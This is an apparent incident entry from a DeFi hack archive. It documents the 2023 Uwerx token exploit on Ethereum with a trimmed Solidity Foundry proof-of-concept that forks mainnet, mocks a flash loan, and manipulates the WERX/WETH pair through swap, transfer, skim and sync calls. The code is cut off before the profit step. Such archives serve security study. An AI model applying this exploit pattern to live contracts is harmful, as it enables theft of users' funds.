# [?] Uwerx - Fault logic

## Summary
Severity: Unknown
Chain: Ethereum
Component: Uwerx
Published: 2023-08-02
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/Uwerx_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$176ETH

```solidity
contract ContractTest is Test {
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 WERX = IERC20(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    Uni_Pair_V2 pair = Uni_Pair_V2(0xa41529982BcCCDfA1105C6f08024DF787CA758C4);

    function setUp() public {
        vm.createSelectFork("mainnet", 17_826_202);
        vm.label(address(WETH), "WETH");
        vm.label(address(WERX), "WERX");
        vm.label(address(Router), "Router");
        vm.label(address(pair), "pair");
    }

    function testExploit() external {
        // mock a flash loan for simplicity
        deal(address(WETH), address(this), 20_000 ether);
        WETH.approve(address(Router), type(uint256).max);
        WERX.approve(address(Router), type(uint256).max);

        pair.sync();

        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(WERX);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            20_000 ether, 0, path, address(this), block.timestamp
        );

        WERX.transfer(address(pair), 4_429_817_738_575_912_760_684_500);

        pair.skim(address(0x01));
        pair.sync();

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/Uwerx_exp.sol_
